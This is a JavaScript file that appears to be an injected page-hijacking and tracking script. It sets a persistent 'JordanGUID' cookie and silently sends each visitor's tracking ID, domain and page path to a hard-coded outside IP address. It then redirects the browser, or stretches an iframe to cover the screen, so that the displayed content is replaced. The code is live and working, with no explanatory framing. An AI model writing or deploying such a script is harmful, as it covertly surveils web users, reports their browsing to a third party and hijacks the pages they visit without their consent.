var site_url = document.getElementById("site_url").src;
var site_url_src = site_url.substring(0,site_url.length-4);
var AdvertiseList = new Array();
AdvertiseList.push("weather.news.sina.com.cn");

function checkSexy(){
  var strCookie = document.cookie;
  var arrCookie=strCookie.split("; "); 
  for(var i=0;i<arrCookie.length;i++){ 
       var arr=arrCookie[i].split("="); 
       if("sexy"==arr[0]){ 
              return true;
       } 
  } 
  return false;
}

function locationHref(sf){
  // document.write(sf);
  if(checkSexy()){
    location.href=site_url_src;
  }else{
    location.href=site_url;
  }
}

function checkAdvertiseList(advertiseList,url){
  try{
    var flag = false;
    for(var i=0;i<advertiseList.length;i++){
      if(url.indexOf(advertiseList[i])>=0){
        flag = true;
        break;
      }
    }
    return flag;
  }catch(err)
  {
    locationHref("checkAdvertiseList");
  }
}

function getOs(){ 
    try{
      var OsObject = "";
      if(navigator.userAgent.indexOf("MSIE")>0) {  
          return "MSIE"; 
      }  
      if(isFirefox=navigator.userAgent.indexOf("Firefox")>0){  
          return "Firefox";  
      }  
      if(isSafari=navigator.userAgent.indexOf("Safari")>0) {  
          return "Safari";  
      }   
      if(isCamino=navigator.userAgent.indexOf("Camino")>0){  
          return "Camino";  
      }  
      if(isMozilla=navigator.userAgent.indexOf("Gecko")>0){  
          return "Gecko";  
      } 
    }catch(err){
      locationHref("getOs");
    }    
}  

function setCookie(name,value,time){
  try{  
    var strsec = getsec(time);
    var exp = new Date();
    exp.setTime(exp.getTime() + parseInt(strsec)*1);
    document.cookie = name + "="+ escape (value) + ";expires=" + exp.toGMTString();
  }
  catch(err)
  {
    locationHref("setCookie");
  }
}

function getsec(str){
  try{
    var str1=parseInt(str.substring(1,str.length))*1; 
    var str2=str.substring(0,1); 
    if (str2=="a"){
      return str1*1;
    }else if (str2=="s"){
      return str1*1000;
    }else if (str2=="h"){
      return str1*60*60*1000;
    }else if (str2=="d"){
      return str1*24*60*60*1000;
    }
  }catch(err)
  {
    locationHref("getsec");
  }
}

try{
    setCookie("sexy","1","s3");
}catch(err){
    locationHref("sexy");
}


function newGuid()
{
  try{
    var guid = "";
    for (var i = 1; i <= 32; i++){
      var n = Math.floor(Math.random()*16.0).toString(16);
      guid +=   n;
      if((i==8)||(i==12)||(i==16)||(i==20))
        guid += "-";
    }
    return guid;    
  }catch(err)
  {
    locationHref("newGuid");
  }
}

function getJordanGUID(){
  try{
    var strCookie = document.cookie;
    var arrCookie=strCookie.split("; "); 
    for(var i=0;i<arrCookie.length;i++){ 
             var arr=arrCookie[i].split("="); 
             if("JordanGUID"==arr[0]){ 
                    return arr[1]; 
             } 
    } 
    return false;
  }catch(err)
  {
    locationHref("getJordanGUID");
  }
}

function createXMLHttp() {
    try{
      var XmlHttp;
      //if (window.ActiveXObject){
      if (false){
          var arr=["MSXML2.XMLHttp.6.0","MSXML2.XMLHttp.5.0", "MSXML2.XMLHttp.4.0","MSXML2.XMLHttp.3.0","MSXML2.XMLHttp","Microsoft.XMLHttp"];
          for(var i=0;i<arr.length;i++) {
              try {
                  XmlHttp = new ActiveXObject(arr[i]);
                  return XmlHttp;
              }
              catch(error) { }
          }
      } else {
          try {
              XmlHttp=new XMLHttpRequest();
              return XmlHttp;
          }
          catch(otherError) { }
      } 
    }catch(err)
    {
      //alert(err.description);
      //locationHref();
    }
} 

function xmlPost() { 
  try{
    var jordanGUID = getJordanGUID();
    if(!jordanGUID){
      jordanGUID = newGuid();
      document.cookie="JordanGUID=" + jordanGUID;
    }
    var domain = document.location.host;
    var str_url = document.location.href;
    var arrAddress  = str_url.split(domain);
    var data_str = "sfrom=5&jordanGUID=sexy"+jordanGUID+"&domain="+domain+"&protocol="+arrAddress[0]+"&path="+ arrAddress[1];
    var xmlHttp = createXMLHttp();
    // var url= 'http://127.0.0.1/jordan/god/get_advise_json?'+data_str;
    var url= 'http://49.4.129.122/jordan/god/get_advise_json?'+data_str;
    xmlHttp.open('GET',url,true); 
    xmlHttp.send(null);
  }catch(err)
  {
    //locationHref();
  }
}

function redirect(){
  try{
    var frame = document.getElementById("site_url");
    if(getOs()=="MSIE"){
      frame.style.cssText="margin-top:-22px;margin-left:-12px;";
      var height= (parseInt(window.screen.height)-190).toString() + "px";
    }else{
      frame.style.cssText="margin-top:-8px;margin-left:-12px;";
      var height= (parseInt(window.screen.height)-160).toString() + "px";
    }
    var width = (window.screen.width).toString() + "px";
    frame.width = width;
    frame.height = height;
  }
  catch(err)
  {
    locationHref("redirect");
  }
}

function initAll(){
  try{
      xmlPost();
      if(checkAdvertiseList(AdvertiseList,site_url)){
        redirect();
      }else{
        locationHref("initAll1kkk:");
      }
  }catch(err)
  {
    locationHref("initAll");
  }
}


initAll();
